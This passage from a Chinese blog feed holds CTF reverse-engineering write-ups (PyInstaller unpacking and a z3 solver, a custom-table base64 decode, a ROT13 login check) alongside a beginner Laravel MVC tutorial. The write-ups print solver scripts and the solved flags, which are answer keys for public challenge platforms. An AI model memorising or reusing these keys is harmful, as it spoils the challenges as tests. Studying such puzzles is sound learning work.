        <content type="html"><![CDATA[<h2 id="1-羊城杯-2020-login"><a href="#1-羊城杯-2020-login" class="headerlink" title="1.[羊城杯 2020]login"></a>1.[羊城杯 2020]login</h2><ul><li>tips:<ul><li>解包pyinstaller打包的exe文件为源码</li><li>z3约束器</li><li>根据字串循环向后异或后的结果复原原文</li></ul></li></ul><p>先放入exeinfope中发现是pyinstaller打包成的exe文件<br>使用pyinstxtractor来unpack<br><a href="https://github.com/countercept/python-exe-unpacker/blob/master/pyinstxtractor.py">https://github.com/countercept/python-exe-unpacker/blob/master/pyinstxtractor.py</a><br><img src="https://i.loli.net/2021/04/17/A4DXl3M6mfGPH8Y.png" alt=""></p><p>打开文件夹中的同名文件，使用010editor打开补上pyc的头部，改后缀为pyc，然后使用uncompyle6来恢复成py源文件</p><p><img src="https://i.loli.net/2021/04/17/rSb4yNE8JInYVm1.png" alt=""></p><p>是个解方程组的问题<br>z3一把梭<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14 = Ints(<span class="string">&quot;a1 a2 a3 a4 a5 a6 a7 a8 a9 a10 a11 a12 a13 a14&quot;</span>)</span><br><span class="line"></span><br><span class="line">s.add(a1 * <span class="number">88</span> + a2 * <span class="number">67</span> + a3 * <span class="number">65</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">89</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">36</span> + a10 * <span class="number">15</span> + a11 * <span class="number">11</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">22748</span>)</span><br><span class="line">s.add(a1 * <span class="number">89</span> + a2 * <span class="number">7</span> + a3 * <span class="number">12</span> - a4 * <span class="number">25</span> + a5 * <span class="number">41</span> + a6 * <span class="number">23</span> + a7 * <span class="number">20</span> - a8 * <span class="number">66</span> + a9 * <span class="number">31</span> + a10 * <span class="number">8</span> + a11 * <span class="number">2</span> - a12 * <span class="number">41</span> - a13 * <span class="number">39</span> + a14 * <span class="number">17</span> == <span class="number">7258</span>)</span><br><span class="line">s.add(a1 * <span class="number">28</span> + a2 * <span class="number">35</span> + a3 * <span class="number">16</span> - a4 * <span class="number">65</span> + a5 * <span class="number">53</span> + a6 * <span class="number">39</span> + a7 * <span class="number">27</span> + a8 * <span class="number">15</span> - a9 * <span class="number">33</span> + a10 * <span class="number">13</span> + a11 * <span class="number">101</span> + a12 * <span class="number">90</span> - a13 * <span class="number">34</span> + a14 * <span class="number">23</span> == <span class="number">26190</span>)</span><br><span class="line">s.add(a1 * <span class="number">23</span> + a2 * <span class="number">34</span> + a3 * <span class="number">35</span> - a4 * <span class="number">59</span> + a5 * <span class="number">49</span> + a6 * <span class="number">81</span> + a7 * <span class="number">25</span> + a8 * <span class="number">128</span> - a9 * <span class="number">32</span> + a10 * <span class="number">75</span> + a11 * <span class="number">81</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">37136</span>)</span><br><span class="line">s.add(a1 * <span class="number">38</span> + a2 * <span class="number">97</span> + a3 * <span class="number">35</span> - a4 * <span class="number">52</span> + a5 * <span class="number">42</span> + a6 * <span class="number">79</span> + a7 * <span class="number">90</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">57</span> + a11 * <span class="number">81</span> + a12 * <span class="number">42</span> - a13 * <span class="number">62</span> - a14 * <span class="number">11</span> == <span class="number">27915</span>)</span><br><span class="line">s.add(a1 * <span class="number">22</span> + a2 * <span class="number">27</span> + a3 * <span class="number">35</span> - a4 * <span class="number">45</span> + a5 * <span class="number">47</span> + a6 * <span class="number">49</span> + a7 * <span class="number">29</span> + a8 * <span class="number">18</span> - a9 * <span class="number">26</span> + a10 * <span class="number">35</span> + a11 * <span class="number">41</span> + a12 * <span class="number">40</span> - a13 * <span class="number">61</span> + a14 * <span class="number">28</span> == <span class="number">17298</span>)</span><br><span class="line">s.add(a1 * <span class="number">12</span> + a2 * <span class="number">45</span> + a3 * <span class="number">35</span> - a4 * <span class="number">9</span> - a5 * <span class="number">42</span> + a6 * <span class="number">86</span> + a7 * <span class="number">23</span> + a8 * <span class="number">85</span> - a9 * <span class="number">47</span> + a10 * <span class="number">34</span> + a11 * <span class="number">76</span> + a12 * <span class="number">43</span> - a13 * <span class="number">44</span> + a14 * <span class="number">65</span> == <span class="number">19875</span>)</span><br><span class="line">s.add(a1 * <span class="number">79</span> + a2 * <span class="number">62</span> + a3 * <span class="number">35</span> - a4 * <span class="number">85</span> + a5 * <span class="number">33</span> + a6 * <span class="number">79</span> + a7 * <span class="number">86</span> + a8 * <span class="number">14</span> - a9 * <span class="number">30</span> + a10 * <span class="number">25</span> + a11 * <span class="number">11</span> + a12 * <span class="number">57</span> - a13 * <span class="number">50</span> - a14 * <span class="number">9</span> == <span class="number">22784</span>)</span><br><span class="line">s.add(a1 * <span class="number">8</span> + a2 * <span class="number">6</span> + a3 * <span class="number">64</span> - a4 * <span class="number">85</span> + a5 * <span class="number">73</span> + a6 * <span class="number">29</span> + a7 * <span class="number">2</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">5</span> + a11 * <span class="number">2</span> + a12 * <span class="number">47</span> - a13 * <span class="number">64</span> + a14 * <span class="number">27</span> == <span class="number">9710</span>)</span><br><span class="line">s.add(a1 * <span class="number">67</span> - a2 * <span class="number">68</span> + a3 * <span class="number">68</span> - a4 * <span class="number">51</span> - a5 * <span class="number">43</span> + a6 * <span class="number">81</span> + a7 * <span class="number">22</span> - a8 * <span class="number">12</span> - a9 * <span class="number">38</span> + a10 * <span class="number">75</span> + a11 * <span class="number">41</span> + a12 * <span class="number">27</span> - a13 * <span class="number">52</span> + a14 * <span class="number">31</span> == <span class="number">13376</span>)</span><br><span class="line">s.add(a1 * <span class="number">85</span> + a2 * <span class="number">63</span> + a3 * <span class="number">5</span> - a4 * <span class="number">51</span> + a5 * <span class="number">44</span> + a6 * <span class="number">36</span> + a7 * <span class="number">28</span> + a8 * <span class="number">15</span> - a9 * <span class="number">6</span> + a10 * <span class="number">45</span> + a11 * <span class="number">31</span> + a12 * <span class="number">7</span> - a13 * <span class="number">67</span> + a14 * <span class="number">78</span> == <span class="number">24065</span>)</span><br><span class="line">s.add(a1 * <span class="number">47</span> + a2 * <span class="number">64</span> + a3 * <span class="number">66</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">112</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">35</span> + a10 * <span class="number">95</span> + a11 * <span class="number">21</span> + a12 * <span class="number">43</span> - a13 * <span class="number">61</span> + a14 * <span class="number">20</span> == <span class="number">27687</span>)</span><br><span class="line">s.add(a1 * <span class="number">89</span> + a2 * <span class="number">67</span> + a3 * <span class="number">85</span> - a4 * <span class="number">25</span> + a5 * <span class="number">49</span> + a6 * <span class="number">89</span> + a7 * <span class="number">23</span> + a8 * <span class="number">56</span> - a9 * <span class="number">92</span> + a10 * <span class="number">14</span> + a11 * <span class="number">89</span> + a12 * <span class="number">47</span> - a13 * <span class="number">61</span> - a14 * <span class="number">29</span> == <span class="number">29250</span>)</span><br><span class="line">s.add(a1 * <span class="number">95</span> + a2 * <span class="number">34</span> + a3 * <span class="number">62</span> - a4 * <span class="number">9</span> - a5 * <span class="number">43</span> + a6 * <span class="number">83</span> + a7 * <span class="number">25</span> + a8 * <span class="number">12</span> - a9 * <span class="number">36</span> + a10 * <span class="number">16</span> + a11 * <span class="number">51</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> - a14 * <span class="number">24</span> == <span class="number">15317</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(s.check())</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure></p><p>然后涉及到的加密算法，自己在平板上演算了一遍，直接从尾到头异或回去就可以了<br><img src="https://i.loli.net/2021/04/17/yHJA2cVlbgSPoXn.png" alt=""></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a2 = <span class="number">24</span></span><br><span class="line">a13 = <span class="number">88</span></span><br><span class="line">a6 = <span class="number">43</span></span><br><span class="line">a9 = <span class="number">52</span></span><br><span class="line">a5 = <span class="number">104</span></span><br><span class="line">a12 = <span class="number">74</span></span><br><span class="line">a7 = <span class="number">28</span></span><br><span class="line">a1 = <span class="number">119</span></span><br><span class="line">a10 = <span class="number">108</span></span><br><span class="line">a11 = <span class="number">88</span></span><br><span class="line">a8 = <span class="number">91</span></span><br><span class="line">a4 = <span class="number">7</span></span><br><span class="line">a3 = <span class="number">10</span></span><br><span class="line">a14 = <span class="number">33</span></span><br><span class="line"></span><br><span class="line">code = [<span class="number">0</span>] * <span class="number">14</span></span><br><span class="line">code[<span class="number">2</span>] = a1 </span><br><span class="line">code[<span class="number">1</span>] = a2 </span><br><span class="line">code[<span class="number">0</span>] = a3 </span><br><span class="line">code[<span class="number">3</span>] = a4 </span><br><span class="line">code[<span class="number">4</span>] = a5 </span><br><span class="line">code[<span class="number">5</span>] = a6 </span><br><span class="line">code[<span class="number">6</span>] = a7 </span><br><span class="line">code[<span class="number">7</span>] = a8 </span><br><span class="line">code[<span class="number">9</span>] = a9 </span><br><span class="line">code[<span class="number">8</span>] = a10</span><br><span class="line">code[<span class="number">10</span>] = a11</span><br><span class="line">code[<span class="number">11</span>] = a12</span><br><span class="line">code[<span class="number">12</span>] = a13</span><br><span class="line">code[<span class="number">13</span>] = a14</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    code[i-<span class="number">1</span>] = code[i] ^ code[i-<span class="number">1</span>]</span><br><span class="line">    flag.append(code[i-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">flag.reverse()</span><br><span class="line">flag.append(code[<span class="number">13</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = <span class="built_in">chr</span>(flag[i])</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span>.join(flag)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(flag.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">print(md5.hexdigest())</span><br></pre></td></tr></table></figure><h2 id="2-CISCN2018-2ex"><a href="#2-CISCN2018-2ex" class="headerlink" title="2.[CISCN2018]2ex"></a>2.[CISCN2018]2ex</h2><p>发现是个静态编译的mips文件，里面还有一份output.txt文件<br>放到ubuntu20.04里，下个qemu-user来跑一下，输入之后就退出了</p><p>分析一下，可以找到一个算法，根据特征识别为base64换表<br><img src="https://i.loli.net/2021/04/19/wuPQMxYlh8jFnHc.png" alt=""></p><p><img src="https://i.loli.net/2021/04/19/FhNgIU9PVHDLe42.png" alt=""></p><p>这里还有padding<br><img src="https://i.loli.net/2021/04/19/JraqnKhvDINU9Zk.png" alt=""></p><p>base64 换表解密即可</p><p>decode.py:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">table = <span class="string">&quot;@,.1fgvw#`/2ehux$~\&quot;3dity%_;4cjsz^+&#123;5bkrA&amp;=&#125;6alqB*-[70mpC()]89noD&quot;</span></span><br><span class="line">old_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">flag1 = <span class="string">&quot;|_r-+_Cl5;vgq_pdme7#7eC0=&quot;</span></span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(flag1.translate(<span class="built_in">str</span>.maketrans(table,old_table)))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel框架学习</title>
      <link href="2021/04/14/Laravel-study/"/>
      <url>2021/04/14/Laravel-study/</url>
      
        <content type="html"><![CDATA[<h2 id="了解框架的MVC模型"><a href="#了解框架的MVC模型" class="headerlink" title="了解框架的MVC模型"></a>了解框架的MVC模型</h2><ul><li>使用框架来实现一个通过url访问用户邮箱的小功能来了解路由，模型和视图的写法</li></ul><p>首先在数据库中插入两条数据<br><img src="https://i.loli.net/2021/04/14/E3uoIHbUyxszrYO.png" alt=""></p><p>使用php artisan生成模型<br><img src="https://i.loli.net/2021/04/14/xiutPL4GvrRQ5nc.png" alt=""></p><p>通过文档得知命名规范如下</p><blockquote><p>数据表名称<br>请注意，我们并没有告诉 Eloquent 我们的 Flight 模型使用哪个数据表。 除非明确地指定了其它名称，否则将使用类的复数形式「蛇形命名」来作为表名。因此，在这种情况下，Eloquent 将假设 Flight 模型存储的是 flights 数据表中的数据，而 AirTrafficController 模型会将记录存储在 air_traffic_controllers 表中。<br>你可以通过在模型上定义 table 属性来指定自定义数据表：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flight</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 与模型关联的表名</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$table</span> = <span class="string">&#x27;my_flights&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><p>所以我们使用的数据表为usertests,模型为Usertest</p><blockquote><p>默认情况下，Eloquent 预期你的数据表中存在 created_at 和 updated_at 两个字段 。如果你不想让 Eloquent 自动管理这两个列， 请将模型中的 $timestamps 属性设置为 false：</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flight</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 是否主动维护时间戳</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$timestamps</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Usertest-php模型代码"><a href="#Usertest-php模型代码" class="headerlink" title="Usertest.php模型代码"></a>Usertest.php模型代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Factories</span>\<span class="title">HasFactory</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Usertest</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">HasFactory</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$timestamps</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PostTestController-php控制器代码"><a href="#PostTestController-php控制器代码" class="headerlink" title="PostTestController.php控制器代码"></a>PostTestController.php控制器代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">laravel_study_user</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">Usertest</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PostTestController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$dbuser</span> = Usertest::query() -&gt; where(<span class="string">&quot;username&quot;</span>,<span class="variable">$user</span>) -&gt; firstOrFail();</span><br><span class="line">        <span class="comment">// dd调试php程序</span></span><br><span class="line">        <span class="comment">//        dd($dbuser);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 修改了alex用户的email</span></span><br><span class="line">        <span class="comment">//        $dbuser-&gt;email = &quot;alex.com&quot;;</span></span><br><span class="line">        <span class="comment">//        $dbuser-&gt;save();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// return视图</span></span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">&quot;posttest&quot;</span>,[<span class="string">&quot;user&quot;</span>=&gt;<span class="variable">$user</span>,<span class="string">&quot;email&quot;</span>=&gt;<span class="variable">$dbuser</span>-&gt;email]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="web-php路由代码"><a href="#web-php路由代码" class="headerlink" title="web.php路由代码"></a>web.php路由代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>\<span class="title">Route</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Web Routes</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Here is where you can register web routes for your application. These</span></span><br><span class="line"><span class="comment">| routes are loaded by the RouteServiceProvider within a group which</span></span><br><span class="line"><span class="comment">| contains the &quot;web&quot; middleware group. Now create something great!</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">&#x27;welcome&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">&#x27;posttest/&#123;user&#125;&#x27;</span>,[\App\Http\Controllers\PostTestController::class,<span class="string">&quot;show&quot;</span>]);</span><br></pre></td></tr></table></figure><h3 id="posttest-blade-php视图代码"><a href="#posttest-blade-php视图代码" class="headerlink" title="posttest.blade.php视图代码"></a>posttest.blade.php视图代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;hello laravel&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt; &#123;&#123; <span class="variable">$user</span> &#125;&#125;&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123; <span class="variable">$email</span> &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="https://i.loli.net/2021/04/14/yceTw72BnEvJ3QU.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> laravel </tag>
            
            <tag> php </tag>
            
            <tag> 开发学习 </tag>
            
            <tag> 开发框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf reverse题解1</title>
      <link href="2021/04/07/buuctf-reverse/"/>
      <url>2021/04/07/buuctf-reverse/</url>
      
        <content type="html"><![CDATA[<h2 id="1-GXYCTF2019-luck-guy"><a href="#1-GXYCTF2019-luck-guy" class="headerlink" title="1.[GXYCTF2019]luck_guy"></a>1.[GXYCTF2019]luck_guy</h2><p>elf文件，64位，目测是输入什么lucky number<br><img src="https://i.loli.net/2021/04/07/Fjytlk8xvTOhY3f.png" alt=""></p><p>不管他，直接ida f5大法<br>主要的函数就是getflag这个函数<br><img src="https://i.loli.net/2021/04/07/6VtlXNYGDeALmrq.png" alt=""><br>设置了随机数，然后switch，本地测试基本不可能走1-5分支<br>目测一下，比较合理的流程就是451<br>4为f2赋值<br>5改f2的值<br>1拼接f1和f2<br>其中f1在data段，有字符串数据，f2在bss未初始化全局变量段<br>然后就走这个流程，一开始脑子抽了，指针那个地方读错了然后就怎么也找不到<br>结合汇编来读，局部变量s其实不是一个long long类型的数据而是一个字符数组</p><p><img src="https://i.loli.net/2021/04/07/vPWqsT9XVmuxpJl.png" alt=""></p><p>然后本地写个脚本一运行就出来了<br>附上本地调试的py脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&quot;7F666F6067756369&quot;</span></span><br><span class="line"></span><br><span class="line">listFlag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">and</span> i != <span class="number">0</span>:</span><br><span class="line">        listFlag.append(flag[i-<span class="number">2</span>:i])</span><br><span class="line"></span><br><span class="line">listFlag.append(<span class="string">&#x27;69&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(listFlag)</span><br><span class="line">listFlag.reverse()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(listFlag)):</span><br><span class="line">    listFlag[i] = <span class="string">&#x27;0x&#x27;</span> + listFlag[i]</span><br><span class="line">    <span class="comment"># listFlag[i] = int(listFlag[i],16)</span></span><br><span class="line"><span class="comment"># print(listFlag)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(listFlag)):</span><br><span class="line">    listFlag[i] = <span class="built_in">int</span>(listFlag[i],base = <span class="number">16</span>)</span><br><span class="line">    print(listFlag)</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        listFlag[i] = listFlag[i] - <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        listFlag[i] = listFlag[i] - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(listFlag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(listFlag)):</span><br><span class="line">    listFlag[i] = <span class="built_in">chr</span>(listFlag[i])</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(listFlag))</span><br></pre></td></tr></table></figure><p>最后得到flag，但是是GXY前缀，换上ctf前缀交上才对<br><code>flag&#123;&#123;do_not_hate_me&#125;</code></p><h2 id="2-BJDCTF2020-JustRE"><a href="#2-BJDCTF2020-JustRE" class="headerlink" title="2.[BJDCTF2020]JustRE"></a>2.[BJDCTF2020]JustRE</h2><p>签到题</p><p>感觉像个win32的小程序<br><img src="https://i.loli.net/2021/04/08/uRZEXSd3ThVbU5q.png" alt=""></p><p>搜字符串大法<br><img src="https://i.loli.net/2021/04/08/7FwZ6BTmgpWUM5z.png" alt=""></p><p>发现格式化字符串<br><img src="https://i.loli.net/2021/04/08/Y6zUuAHxFZedtk9.png" alt=""></p><p>交上就对了555</p><h2 id="3-FlareOn4-login"><a href="#3-FlareOn4-login" class="headerlink" title="3.[FlareOn4]login"></a>3.[FlareOn4]login</h2><p>下载下来发现是html文件<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;prompt&quot;</span>).onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="built_in">document</span>.getElementById(<span class="string">&quot;flag&quot;</span>).value;</span><br><span class="line">    <span class="keyword">var</span> rotFlag = flag.replace(<span class="regexp">/[a-zA-Z]/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode((c &lt;= <span class="string">&quot;Z&quot;</span> ? <span class="number">90</span> : <span class="number">122</span>) &gt;= (c = c.charCodeAt(<span class="number">0</span>) + <span class="number">13</span>)     ? c : c - <span class="number">26</span>);&#125;);</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span> == rotFlag) &#123;</span><br><span class="line">        alert(<span class="string">&quot;Correct flag!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        alert(<span class="string">&quot;Incorrect flag, rot again&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>发现一段js代码<br>分析发现核心逻辑主要是这一句，只要是字母就被正则匹配到，然后执行下面这个<br><code>String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122) &gt;= (c = c.charCodeAt(0) + 13)     ? c : c - 26);&#125;);</code><br>大概就是判断字符是否小于Z，如果是第一个括号的值就变成Z否则变成z(注意此时c的值没有发生改变)，然后第二个小括号是将c本身+13(注意此时c的值已经发生了改变)<br>再判断两个值的大小关系，如果前者大就不改变，如果后者大就-26(即相当于+13后-26，本质是原本的字符-13)<br>字母一共26个，如果本身变成z后大于本身+13，那么字母一定会小于n</p><p>有了这个逻辑写解密脚本就可以了，遍历加密后的字符串，如果当前字符属于a-m，那么+13，如果属于n-z，那么-13即可<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span></span><br><span class="line">flag = <span class="built_in">list</span>(flag)</span><br><span class="line"></span><br><span class="line">flaglist = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> (flag[i] &lt;= <span class="string">&#x27;Z&#x27;</span> <span class="keyword">and</span> flag[i] &gt;= <span class="string">&#x27;A&#x27;</span>) <span class="keyword">or</span> (flag[i] &gt;= <span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> flag[i] &lt;= <span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> (flag[i] &lt;= <span class="string">&#x27;M&#x27;</span> <span class="keyword">and</span> flag[i] &gt;= <span class="string">&#x27;A&#x27;</span>) <span class="keyword">or</span> (flag[i] &lt;= <span class="string">&#x27;m&#x27;</span> <span class="keyword">and</span> flag[i] &gt;= <span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">            flag[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i]) + <span class="number">13</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i]) - <span class="number">13</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure></p><p><code>flag&#123;ClientSideLoginsAreEasy@flare-on.com&#125;</code></p><p>看了别的师傅的wp才发现这是一种加密为ROT13加密，学到了</p><blockquote><p>套用ROT13到一段文字上仅仅只需要检查字元字母顺序并取代它在13位之后的对应字母，有需要超过时则重新绕回26英文字母开 